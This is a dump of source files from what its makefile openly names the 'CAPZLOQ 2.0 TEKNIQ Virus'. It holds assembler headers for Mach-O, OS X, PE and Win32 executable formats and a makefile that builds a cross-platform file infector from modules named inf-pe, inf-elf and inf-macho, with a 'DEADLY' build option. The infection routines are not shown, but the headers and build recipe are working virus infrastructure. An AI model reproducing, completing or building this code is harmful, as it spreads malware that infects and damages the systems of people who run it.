		mach_1386_edi		dd		?
		mach_1386_esi		dd		?
		mach_1386_ebp		dd		?
		mach_1386_esp		dd		?
		mach_i386_ss		dd		?
		mach_i386_eflags	dd		?
		mach_i386_eip		dd		?
		mach_i386_cs		dd		?		
		mach_i386_ds		dd		?
		mach_i386_es		dd		?
		mach_i386_fs		dd		?
		mach_i386_gs		dd		?		
mach_i386_thread_state_t	ENDS
;-----------------------------------------------------------------------------
fat_header			STRUC
		fathdr_magic		dd		?
		fathdr_nfat_arch	dd		?
fat_header			ENDS

;-----------------------------------------------------------------------------
fat_arch			STRUC
		fat_cputype		dd		?	; 7
		fat_cpusubtype		dd		?
		fat_offset		dd		?
		fat_size		dd		?
		fat_align		dd		?	; 12
fat_arch			ENDS
;-----------------------------------------------------------------------------
.list
[------------------------------ macho.inc ------------------------------]
[------------------------------ osx.inc ------------------------------]
.xlist

osx$MAXNAMLEN 			EQU	255

osx$DT_REG			EQU	8

osx$O_RDONLY 			EQU	0
osx$O_WRONLY 			EQU	1
osx$O_RDWR			EQU	2

osx$O_EXLOCK			EQU	20h

osx$SEEK_BEGIN                  EQU     0
osx$SEEK_CURRENT                EQU     1
osx$SEEK_END                    EQU     2

osx$S_IFMT			EQU	0F000h
osx$S_IFREG 			EQU	08000h

osx$S_IRUSR 			EQU	100h
osx$S_IWUSR 			EQU	80h

osx$UF_NODUMP 			EQU	00001h
osx$UF_IMMUTABLE		EQU	00002h
osx$UF_APPEND			EQU	00004h
osx$UF_OPAQUE			EQU	00008h
osx$UF_HIDDEN			EQU	08000h
osx$SF_IMMUTABLE		EQU	20000h
osx$SF_APPEND			EQU	40000h

osx$BAD_STFLAGS			=	(osx$UF_IMMUTABLE	OR\
					osx$UF_APPEND		OR\
					osx$UF_OPAQUE		OR\
					osx$UF_HIDDEN		OR\
					osx$SF_IMMUTABLE	OR\
					osx$SF_APPEND)
					
osx$PROT_READ 			EQU	1h
osx$PROT_WRITE			EQU	2h

osx$MAP_FILE			EQU	0h
osx$MAP_ANON			EQU	1000h
osx$MAP_SHARED			EQU	1h
osx$MAP_PRIVATE			EQU	2h

;==========================================================================
osx$dirent			STRUC
	osx$d_fileno		dd	?
	osx$d_reclen		dw 	?
	osx$d_type		db	?
	osx$d_namelen		db	?
	osx$d_name		db osx$MAXNAMLEN+1 dup(?)	
osx$dirent			ENDS

;--------------------------------------------------------------------------
osx$stat                        STRUC

        osx$st_dev              dd      ?       ; 0
        osx$st_mode             dw      ?       ; 4
        osx$st_nlink            dw      ?       ; 6
        osx$st_ino              dq      ?       ; 8
        osx$st_uid              dd      ?       ; 16
        osx$st_gid              dd      ?       ; 20
        osx$st_rdev             dd      ?       ; 24
        osx$st_atimespec        dq      ?       ; 28
        osx$st_mtimespec        dq      ?       ; 36
        osx$st_ctimespec        dq      ?       ; 44
        osx$st_birthtimespec    dq      ?       ; 52
        osx$st_size             dq      ?       ; 60
        osx$st_blocks           dq      ?       ; 68
        osx$st_blksize          dd      ?       ; 76
        osx$st_flags            dd      ?       ; 80
        osx$st_gen              dd      ?       ; 84
        osx$st_lspare           dd      ?       ; 88
        osx$st_qspare           dq 2 dup (?)    ; 92
                                                ; size = 108
osx$stat                        ENDS
;==========================================================================
.list
[------------------------------ osx.inc ------------------------------]
[------------------------------ pe.inc ------------------------------]
 .xlist
IMAGE_FILE_MACHINE_I386			EQU		014Ch

IMAGE_FILE_EXECUTABLE_IMAGE		EQU		0002h
IMAGE_FILE_32BIT_MACHINE		EQU		0100h
IMAGE_FILE_SYSTEM			EQU		1000h
IMAGE_FILE_DLL				EQU		2000h
IMAGE_FILE_UP_SYSTEM_ONLY		EQU		4000h

;-----------------------------------------------------------------------------
PE_DirEntry     STRUC
		pedir_VA                dd      ?
		pedir_Size              dd      ?
PE_DirEntry     ENDS

;-----------------------------------------------------------------------------
PE_Hdr          STRUC
		; PE File Header.
		peh_Marker              dd      ?
		peh_Machine             dw      ?
		peh_SectionCount        dw      ?
		peh_TimeDateStamp       dd      ?
		peh_SymbTable_Ptr       dd      ?
		peh_SymbTable_Count     dd      ?
		peh_NTHdrSize           dw      ?
		peh_Flags               dw      ?
		; NT Optional Header.
		; Standard Fields.
		peh_Magic               dw      ?
		peh_LinkMajor           db      ?
		peh_LinkMinor           db      ?
		peh_CodeSize            dd      ?
		peh_DataSize            dd      ?
		peh_BSSSize             dd      ?
		peh_EntryPointRVA       dd      ?
		peh_CodeBase            dd      ?
		peh_DataBase            dd      ?
		; NT Additional Fields.
		peh_ImageBase           dd      ?
		peh_SectionAlign        dd      ?
		peh_FileAlign           dd      ?
		peh_OSMajor             dw      ?
		peh_OSMinor             dw      ?
		peh_UserMajor           dw      ?
		peh_UserMinor           dw      ?
		peh_SubSysMajor         dw      ?
		peh_SubSysMinor         dw      ?
		peh_Win32_Version       dd      ?
		peh_ImageSize           dd      ?
		peh_HeaderSize          dd      ?
		peh_FileChecksum        dd      ?
		peh_SubSystem           dw      ?
		peh_DLLFlags            dw      ?
		peh_StackReserveSize    dd      ?
		peh_StackCommitSize     dd      ?
		peh_HeapReserveSize     dd      ?
		peh_HeapCommitSize      dd      ?
		peh_LoaderFlags         dd      ?
		peh_RVATableCount       dd      ?
		;Data Directory
		peh_ExportDirectory	PE_DirEntry<>
		peh_ImportDirectory	PE_DirEntry<>
		peh_ResourceDirectory	PE_DirEntry<>
		peh_ExceptionDirectoy	PE_DirEntry<>
		peh_SecurityDirectory	PE_DirEntry<>
		peh_BaseRelocDirectory	PE_DirEntry<>
		peh_DebugDirectoy	PE_DirEntry<>
		peh_CopyrightDirectory	PE_DirEntry<>
		peh_MIPSGP_Directory	PE_DirEntry<>
		peh_TLSDirectory	PE_DirEntry<>
		peh_LoadConfigDirectory	PE_DirEntry<>
PE_Hdr          ENDS

;-----------------------------------------------------------------------------
PE_Export       STRUC
		peexp_Flags             dd      ?	; 00
		peexp_TimeDateStamp     dd      ?	; 04	
		peexp_MajorVersion      dw      ?	; 08
		peexp_MinorVersion      dw      ?	; 0A
		peexp_ModuleNamePtr     dd      ?	; 0C
		peexp_OrdinalBase       dd      ?	; 10
		peexp_ProcCount         dd      ?	; 14
		peexp_NameCount         dd      ?	; 18
		peexp_ProcListPtr       dd      ?	; 1C
		peexp_NameListPtr       dd      ?	; 20
		peexp_OrdinalListPtr    dd      ?	; 28
PE_Export       ENDS

;-----------------------------------------------------------------------------
PE_Import       STRUC
		peimp_ProcNameListRVA   dd      ?
		peimp_Reserved0         dd      ?
		peimp_Reserved1         dd      ?
		peimp_ModuleNameRVA     dd      ?
		peimp_ProcAddrListRVA   dd      ?
PE_Import       ENDS

;-----------------------------------------------------------------------------
IMAGE_SIZEOF_SHORT_NAME = 8

PE_Sec          STRUC
		pesec_Name              db      IMAGE_SIZEOF_SHORT_NAME dup(?)
		UNION
			pesec_PhysicalAddress   dd      ?
			pesec_VirtualSize       dd      ?
		ENDS
		pesec_VirtualAddress    dd      ?
		pesec_RawDataSize       dd      ?
		pesec_RawDataPtr        dd      ?
		pesec_RelocationsPtr    dd      ?
		pesec_LineNumbersPtr    dd      ?
		pesec_nRelocations      dw      ?
		pesec_nLineNumbers      dw      ?
		pesec_Flags             dd      ?
PE_Sec          ENDS
.list
[------------------------------ pe.inc ------------------------------]
[------------------------------ SHORT.INC ------------------------------]
;=============================================================================
.xlist
;-----------------------------------------------------------------------------
dwo             equ     dword ptr
qwo             equ     qword ptr
wo              equ     word ptr
by              equ     byte ptr
ofs             equ     offset
L               equ     <large>
S               equ     <small>
W?              equ     1111h

;-----------------------------------------------------------------------------
stQWORD         STRUC
		dwLO    dd      ?
		dwHI    dd      ?
stQWORD         ENDS

stDWORD         STRUC
		wLO     dw      ?
		wHI     dw      ?
stDWORD         ENDS

stWORD          STRUC
		bLO     db      ?
		bHI     db      ?
stWORD          ENDS

;-----------------------------------------------------------------------------
PLABEL          MACRO   name
		&name   LABEL
		PUBLIC  &name
		ENDM

;-----------------------------------------------------------------------------
.list
;=============================================================================


[------------------------------ SHORT.INC ------------------------------]
[------------------------------ stack.inc ------------------------------]
;==============================================================================
        .xlist
;------------------------------------------------------------------------------
stPUSHAD        STRUC
                dwEDI   dd      ?
                dwESI   dd      ?
                dwEBP   dd      ?
                dwESP   dd      ?
                dwEBX   dd      ?
                dwEDX   dd      ?
                dwECX   dd      ?
                dwEAX   dd      ?
                dwEFL   dd      ?
                dwRET   dd      ?
stPUSHAD        ENDS

;------------------------------------------------------------------------------
        .list
;==============================================================================

[------------------------------ stack.inc ------------------------------]
[------------------------------ WIN32.INC ------------------------------]
.xlist
;=============================================================================
.486
;-----------------------------------------------------------------------------

UCHAR                           EQU <db>
USHORT                          EQU <dw>
UINT                            EQU <dd>
ULONG                           EQU <dd>

;-----------------------------------------------------------------------------
NULL                            EQU       0
FALSE                           EQU       0
TRUE                            EQU       1
MAX_PATH                        EQU       260
INVALID_HANDLE_VALUE            EQU       -1
STANDARD_RIGHTS_REQUIRED        EQU       000F0000h

;-----------------------------------------------------------------------------
GENERIC_READ                    EQU       80000000h
GENERIC_WRITE                   EQU       40000000h


;-----------------------------------------------------------------------------
FILE_SHARE_READ         	EQU       00000001h
FILE_SHARE_WRITE        	EQU       00000002h

;-----------------------------------------------------------------------------
CREATE_NEW			EQU       1
CREATE_ALWAYS			EQU       2
OPEN_EXISTING			EQU       3
OPEN_ALWAYS			EQU       4
TRUNCATE_EXISTING		EQU       5

;-----------------------------------------------------------------------------
FILE_ATTRIBUTE_READONLY         EQU       00000001h
FILE_ATTRIBUTE_HIDDEN           EQU       00000002h
FILE_ATTRIBUTE_SYSTEM           EQU       00000004h
FILE_ATTRIBUTE_DIRECTORY        EQU       00000010h
FILE_ATTRIBUTE_ARCHIVE          EQU       00000020h
FILE_ATTRIBUTE_DEVICE		EQU	00000040h
FILE_ATTRIBUTE_NORMAL           EQU       00000080h
FILE_ATTRIBUTE_TEMPORARY        EQU       00000100h
FILE_ATTRIBUTE_SPARSE_FILE      EQU       00000200h
FILE_ATTRIBUTE_REPARSE_POINT    EQU       00000400h
FILE_ATTRIBUTE_COMPRESSED       EQU       00000800h
FILE_ATTRIBUTE_OFFLINE        	EQU       00001000h
FILE_ATTRIBUTE_VIRTUAL		EQU		00010000h

; flags -
FILE_ATTRIBUTE_POSIX_SEMANTICS      EQU       01000000h
FILE_ATTRIBUTE_BACKUP_SEMANTICS     EQU       02000000h
FILE_ATTRIBUTE_DELETE_ON_CLOSE      EQU       04000000h
FILE_ATTRIBUTE_SEQUENTIAL_SCAN      EQU       08000000h
FILE_ATTRIBUTE_RANDOM_ACCESS        EQU       10000000h
FILE_ATTRIBUTE_NO_BUFFERING         EQU       20000000h
FILE_ATTRIBUTE_OVERLAPPED           EQU       40000000h
FILE_ATTRIBUTE_WRITE_THROUGH        EQU       80000000h

BAD_FILE_ATTRIBUTES	=	(FILE_ATTRIBUTE_HIDDEN			OR\
				FILE_ATTRIBUTE_SYSTEM			OR\
				FILE_ATTRIBUTE_DIRECTORY		OR\
				FILE_ATTRIBUTE_DEVICE			OR\
				FILE_ATTRIBUTE_SPARSE_FILE		OR\									
				FILE_ATTRIBUTE_OFFLINE			OR\
				FILE_ATTRIBUTE_TEMPORARY)
									


;-----------------------------------------------------------------------------
SECTION_QUERY                   EQU     00001h
SECTION_MAP_WRITE               EQU     00002h
SECTION_MAP_READ                EQU     00004h
SECTION_MAP_EXECUTE             EQU     00008h
SECTION_EXTEND_SIZE             EQU     00010h

SECTION_ALL_ACCESS      =       (STANDARD_RIGHTS_REQUIRED       OR\
                                SECTION_QUERY                   OR\
                                SECTION_MAP_WRITE               OR\
                                SECTION_MAP_READ                OR\
                                SECTION_MAP_EXECUTE             OR\
                                SECTION_EXTEND_SIZE)

FILE_MAP_COPY       EQU     SECTION_QUERY
FILE_MAP_WRITE      EQU     SECTION_MAP_WRITE
FILE_MAP_READ       EQU     SECTION_MAP_READ
FILE_MAP_ALL_ACCESS EQU     SECTION_ALL_ACCESS

;-----------------------------------------------------------------------------
PAGE_NOACCESS           EQU     001h
PAGE_READONLY           EQU     002h
PAGE_READWRITE          EQU     004h
PAGE_WRITECOPY          EQU     008h
PAGE_EXECUTE            EQU     010h
PAGE_EXECUTE_READ       EQU     020h
PAGE_EXECUTE_READWRITE  EQU     040h
PAGE_EXECUTE_WRITECOPY  EQU     080h
PAGE_GUARD              EQU     0100h
PAGE_NOCACHE            EQU     0200h
       
MEM_COMMIT              EQU     01000h
MEM_RESERVE             EQU     02000h
MEM_DECOMMIT            EQU     04000h
MEM_RELEASE             EQU     08000h
MEM_FREE                EQU     010000h
MEM_PRIVATE             EQU     020000h
MEM_MAPPED              EQU     040000h
MEM_RESET               EQU     080000h
MEM_TOP_DOWN            EQU     0100000h
MEM_4MB_PAGES           EQU     080000000h
SEC_FILE                EQU     0800000h
SEC_IMAGE               EQU     01000000h
SEC_VLM                 EQU     02000000h
SEC_RESERVE             EQU     04000000h
SEC_COMMIT              EQU     08000000h
SEC_NOCACHE             EQU     010000000h
MEM_IMAGE               EQU     SEC_IMAGE

;------------------------------------------------------------------------------
INVALID_FILE_SIZE   EQU     0FFFFFFFFh
        
FILE_BEGIN              EQU     0
FILE_CURRENT            EQU     1
FILE_END                EQU     2


;-----------------------------------------------------------------------------
IMAGE_DOS_SIGNATURE                     EQU     05A4Dh
IMAGE_OS2_SIGNATURE                     EQU     0454Eh
IMAGE_OS2_SIGNATURE_LE                  EQU     0454Ch
IMAGE_VXD_SIGNATURE                     EQU     0454Ch
IMAGE_NT_SIGNATURE                      EQU     000004550h

IMAGE_SIZEOF_FILE_HEADER                EQU     20

IMAGE_FILE_RELOCS_STRIPPED              EQU     00001h
IMAGE_FILE_EXECUTABLE_IMAGE             EQU     00002h
IMAGE_FILE_LINE_NUMS_STRIPPED           EQU     00004h
IMAGE_FILE_LOCAL_SYMS_STRIPPED          EQU     00008h
IMAGE_FILE_AGGRESIVE_WS_TRIM            EQU     00010h
IMAGE_FILE_BYTES_REVERSED_LO            EQU     00080h
IMAGE_FILE_32BIT_MACHINE                EQU     00100h
IMAGE_FILE_DEBUG_STRIPPED               EQU     00200h
IMAGE_FILE_REMOVABLE_RUN_FROM_SW        EQU     00400h
IMAGE_FILE_NET_RUN_FROM_SWAP            EQU     00800h
IMAGE_FILE_SYSTEM                       EQU     01000h
IMAGE_FILE_DLL                          EQU     02000h
IMAGE_FILE_UP_SYSTEM_ONLY               EQU     04000h
IMAGE_FILE_BYTES_REVERSED_HI            EQU     08000h

IMAGE_FILE_MACHINE_UNKNOWN      EQU       0
IMAGE_FILE_MACHINE_I386         EQU       014ch
IMAGE_FILE_MACHINE_R3000        EQU       0162h
IMAGE_FILE_MACHINE_R4000        EQU       0166h
IMAGE_FILE_MACHINE_R10000       EQU       0168h
IMAGE_FILE_MACHINE_ALPHA        EQU       0184h
IMAGE_FILE_MACHINE_POWERPC      EQU       01F0h


IMAGE_NUMBEROF_DIRECTORY_ENTRIES        EQU     16

IMAGE_SIZEOF_ROM_OPTIONAL_HEADER        EQU     56
IMAGE_SIZEOF_STD_OPTIONAL_HEADER        EQU     28
IMAGE_SIZEOF_NT_OPTIONAL_HEADER         EQU     224

IMAGE_NT_OPTIONAL_HDR_MAGIC             EQU     010bh
IMAGE_ROM_OPTIONAL_HDR_MAGIC            EQU     0107h


IMAGE_SUBSYSTEM_UNKNOWN			EQU	0
IMAGE_SUBSYSTEM_NATIVE			EQU	1
IMAGE_SUBSYSTEM_WINDOWS_GUI		EQU	2
IMAGE_SUBSYSTEM_WINDOWS_CUI		EQU	3
IMAGE_SUBSYSTEM_OS2_CUI			EQU	5
IMAGE_SUBSYSTEM_POSIX_CUI		EQU	6
IMAGE_SUBSYSTEM_RESERVED8		EQU	8

IMAGE_DIRECTORY_ENTRY_EXPORT		EQU	0
IMAGE_DIRECTORY_ENTRY_IMPORT		EQU	1
IMAGE_DIRECTORY_ENTRY_RESOURCE		EQU	2
IMAGE_DIRECTORY_ENTRY_EXCEPTION		EQU	3
IMAGE_DIRECTORY_ENTRY_SECURITY		EQU	4
IMAGE_DIRECTORY_ENTRY_BASERELOC		EQU	5
IMAGE_DIRECTORY_ENTRY_DEBUG		EQU	6
IMAGE_DIRECTORY_ENTRY_COPYRIGHT		EQU	7
IMAGE_DIRECTORY_ENTRY_GLOBALPTR		EQU	8
IMAGE_DIRECTORY_ENTRY_TLS		EQU	9
IMAGE_DIRECTORY_ENTRY_LOAD_CONFI	EQU	10
IMAGE_DIRECTORY_ENTRY_BOUND_IMPO	EQU	11
IMAGE_DIRECTORY_ENTRY_IAT		EQU	12

WFILETIME       STRUC
		wft_dwLowDateTime        dd ?
		wft_dwHighDateTime       dd ?
WFILETIME       ENDS

WFF             STRUC
		wff_FileAttributes      dd      ?
		wff_wftCreationTime     WFILETIME ?
		wff_wftLastAccessTime   WFILETIME ?
		wff_wftLastWriteTime    WFILETIME ?
		wff_FileSizeHigh        dd      ?
		wff_FileSizeLow         dd      ?
		wff_Reserved0           dd      ?
		wff_Reserved1           dd      ?
		wff_FileName            dw      MAX_PATH dup(?)
		wff_AlternateFileName   dw      14 dup(?)
		align 4
WFF             ENDS

IMAGE_SCN_TYPE_NO_PAD                   EQU     000000008h
IMAGE_SCN_CNT_CODE                      EQU     000000020h
IMAGE_SCN_CNT_INITIALIZED_DATA          EQU     000000040h
IMAGE_SCN_CNT_UNINITIALIZED_DATA        EQU     000000080h
IMAGE_SCN_LNK_OTHER                     EQU     000000100h
IMAGE_SCN_LNK_INFO                      EQU     000000200h
IMAGE_SCN_LNK_REMOVE                    EQU     000000800h
IMAGE_SCN_LNK_COMDAT                    EQU     000001000h
IMAGE_SCN_MEM_FARDATA                   EQU     000008000h
IMAGE_SCN_MEM_PURGEABLE                 EQU     000020000h
IMAGE_SCN_MEM_16BIT                     EQU     000020000h
IMAGE_SCN_MEM_LOCKED                    EQU     000040000h
IMAGE_SCN_MEM_PRELOAD                   EQU     000080000h
IMAGE_SCN_ALIGN_1BYTES                  EQU     000100000h
IMAGE_SCN_ALIGN_2BYTES                  EQU     000200000h
IMAGE_SCN_ALIGN_4BYTES                  EQU     000300000h
IMAGE_SCN_ALIGN_8BYTES                  EQU     000400000h
IMAGE_SCN_ALIGN_16BYTES                 EQU     000500000h
IMAGE_SCN_ALIGN_32BYTES                 EQU     000600000h
IMAGE_SCN_ALIGN_64BYTES                 EQU     000700000h
IMAGE_SCN_LNK_NRELOC_OVFL               EQU     001000000h
IMAGE_SCN_MEM_DISCARDABLE               EQU     002000000h
IMAGE_SCN_MEM_NOT_CACHED                EQU     004000000h
IMAGE_SCN_MEM_NOT_PAGED                 EQU     008000000h
IMAGE_SCN_MEM_SHARED                    EQU     010000000h
IMAGE_SCN_MEM_EXECUTE                   EQU     020000000h
IMAGE_SCN_MEM_READ                      EQU     040000000h
IMAGE_SCN_MEM_WRITE                     EQU     080000000h

;=============================================================================
.list

[------------------------------ WIN32.INC ------------------------------]
[------------------------------ makefile -------------------------------]
#   Make file for CAPZLOQ 2.0 TEKNIQ Virus
#   Copyright (c) 2013 J-FUQING-PANIC
#
#       make -B                     Build clt20.exe
#       make -B -DDEBUG             Build debug clt20.exe
#       make -B -DDEADLY            Build clt20-deadly.ex_
#       make -B -DDEADLY -DDEBUG    Build debug clt20-deadly.ex_
#       make tools		    Build .\tools binaries
#	make clean		    Remove obj,lst,map,ex? files,infected samples

.autodepend

NAME = CLT20

!if $d(DEADLY)
EXENAME = $(NAME)-DEADLY
EXE_EXTENSION  = EX_
TARGET_DIR = DEADLY
TASMDEADLY = /dDEADLY=1
!else
EXENAME = $(NAME)
EXE_EXTENSION = EXE
TARGET_DIR = TEST
TASMDEADLY=
!endif

TOOL_TARGET_DIR = .\tools

#NAME = CLT20
# Base VA of first gen virus.
VBase = 400000

# Modules in order of linking.
OBJS =  $(TARGET_DIR)\vmain.obj\
        $(TARGET_DIR)\osprocs.obj\
	$(TARGET_DIR)\win32-procs.obj\
	$(TARGET_DIR)\linux-procs.obj\
	$(TARGET_DIR)\osx-procs.obj\
	$(TARGET_DIR)\strhash32.obj\
	$(TARGET_DIR)\rand.obj\ 
	$(TARGET_DIR)\inf-pe.obj\
	$(TARGET_DIR)\inf-elf.obj\
	$(TARGET_DIR)\inf-macho.obj\
        $(TARGET_DIR)\vhost.obj

# Executable Definition file.
DEF  = $(EXENAME).def

# Path of TASM Installation and other tools
TASMPATH = .\bin
BINPATH = .\bin

# Optional Debug parameters.
!if $d(DEBUG)
TASMDEBUG=/zi
LINKDEBUG=-v
!else
TASMDEBUG=/zn
LINKDEBUG=
!endif

# Utilities used.
TASM = $(TASMPATH)\tasm32
TLINK = $(TASMPATH)\tlink32

# The main target - CAPZLOQ TEKNIQ VIRUS 2.0
$(EXENAME).$(EXE_EXTENSION): $(OBJS) $(DEF)
  # Build linker response file.
  echo $(LINKDEBUG) -c -m -Tpe -B:$(VBase) + > lnkresp
  echo $(TARGET_DIR)\vmain.obj + >> lnkresp
  echo $(TARGET_DIR)\osprocs.obj + >> lnkresp
  echo $(TARGET_DIR)\win32-procs.obj + >> lnkresp
  echo $(TARGET_DIR)\linux-procs.obj + >> lnkresp
  echo $(TARGET_DIR)\osx-procs.obj + >> lnkresp
  echo $(TARGET_DIR)\strhash32.obj + >> lnkresp
  echo $(TARGET_DIR)\rand.obj + >> lnkresp
  echo $(TARGET_DIR)\inf-pe.obj + >> lnkresp
  echo $(TARGET_DIR)\inf-elf.obj + >> lnkresp
  echo $(TARGET_DIR)\inf-macho.obj + >> lnkresp
  echo $(TARGET_DIR)\vhost.obj, + >> lnkresp
  echo $(EXENAME).$(EXE_EXTENSION), $(EXENAME), .\bin\import32, $(DEF) >> lnkresp
  $(TLINK) @lnkresp
  del lnkresp
  find "VHost" $(EXENAME).map

$(TARGET_DIR)\vmain.obj: .\vmain.asm
$(TARGET_DIR)\osprocs.obj: .\osprocs.asm
$(TARGET_DIR)\win32-procs.obj: .\win32-procs.asm
$(TARGET_DIR)\linux-procs.obj: .\linux-procs.asm
$(TARGET_DIR)\osx-procs.obj: .\osx-procs.asm
$(TARGET_DIR)\strhash32.obj: .\strhash32.asm 
$(TARGET_DIR)\rand.obj: .\rand.asm
$(TARGET_DIR)\inf-pe.obj: .\inf-pe.asm
$(TARGET_DIR)\inf-elf.obj: .\inf-elf.asm
$(TARGET_DIR)\inf-macho.obj: .\inf-macho.asm
$(TARGET_DIR)\vhost.obj: .\vhost.asm

$(TOOL_TARGET_DIR)\strhash32.exe: $(TOOL_TARGET_DIR)\strhash32.c
$(TOOL_TARGET_DIR)\dumpmod.exe: $(TOOL_TARGET_DIR)\dumpmod.c
$(TOOL_TARGET_DIR)\maxphdrs: $(TOOL_TARGET_DIR)\maxphdrs.c

tools: $(TOOL_TARGET_DIR)\strhash32.exe $(TOOL_TARGET_DIR)\dumpmod.exe $(TOOL_TARGET_DIR)\maxphdrs.exe

# Clean-up directory.
clean:
 -del *.ex?
 -del *.obj
 -del *.map
 -del *.lst
 -del deadly\*.lst
 -del deadly\*.obj
 -del test\*.lst
 -del test\*.obj
 -del $(TOOL_TARGET_DIR)\*.exe
 -del samples\r*
 -del samples\infectedsamples\s*
 
# Assembly rule.
.asm.obj:
  $(TASM) $(TASMDEBUG) $(TASMDEADLY) /dVBase=$(VBase)h /ml /m9 /l /n /c /t $&.asm, $@, $(TARGET_DIR)\\$&.lst

.c.exe:
  gcc -o $@ $<

[------------------------------ makefile -------------------------------]
